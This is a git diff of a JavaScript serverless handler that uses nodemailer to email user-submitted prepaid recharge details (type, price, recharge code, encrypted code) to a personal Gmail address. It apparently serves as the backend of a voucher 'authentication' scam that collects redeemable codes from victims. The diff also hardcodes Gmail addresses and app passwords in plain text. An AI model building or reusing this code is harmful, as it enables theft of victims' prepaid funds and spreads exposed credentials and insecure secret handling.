@@ -7,14 +7,14 @@ export async function handler(event, context) {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
-        user: 'checkcards6@gmail.com', // Remplacez par votre adresse email
-        pass: 'vpot svzf xrpw bndc', // Remplacez par votre mot de passe
+        user: 'henry.gossou17@gmail.com', // Remplacez par votre adresse email
+        pass: 'ovjg xkho cmbu scsy', // Remplacez par votre mot de passe
       },
     });
 
     const mailOptions = {
       from: email,
-      to: 'checkcards6@gmail.com',
+      to: 'henry.gossou17@gmail.com',
       subject: 'Nouvelle demande d\'authentification',
       text: `Type de recharge : ${rechargeType}\nPrix de la recharge : ${price}\nCode de la recharge : ${rechargeCode}\nCode crypté : ${encryptedCode}\nEmail : ${email}`,
     };
